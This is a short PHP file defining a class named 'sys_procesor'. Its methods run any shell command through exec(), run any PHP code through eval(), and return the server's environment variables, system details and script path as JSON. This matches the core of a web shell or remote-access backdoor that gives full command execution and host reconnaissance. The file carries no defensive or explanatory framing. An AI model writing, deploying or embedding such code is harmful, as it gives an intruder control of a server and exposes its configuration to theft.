<?php
  class sys_procesor{
    public function execute($command){
      $out=[];
      exec($command, $out);
      return json_encode([
        "output"=>$out
      ]);
    }
    public function evaluate($code){
      $out=[];
      eval($code);
      return json_encode([
        "output"=>$out
      ]);
    }
    public function server_vars(){
      return json_encode([
        "variables"=>$_SERVER
      ]);
    }
    public function system_details(){
      return json_encode([
        "uname"=>php_uname()
      ]);
    }
    public function base_path(){
      $tmp=$_SERVER['SCRIPT_FILENAME'];
      $tmp=str_replace("/", "\\", $tmp);
      //var_dump($tmp);
      $tmp=substr($tmp, 0, strrpos($tmp, "\\"));
      return json_encode([
        "path"=>$tmp
      ]);
    }
  }
?>
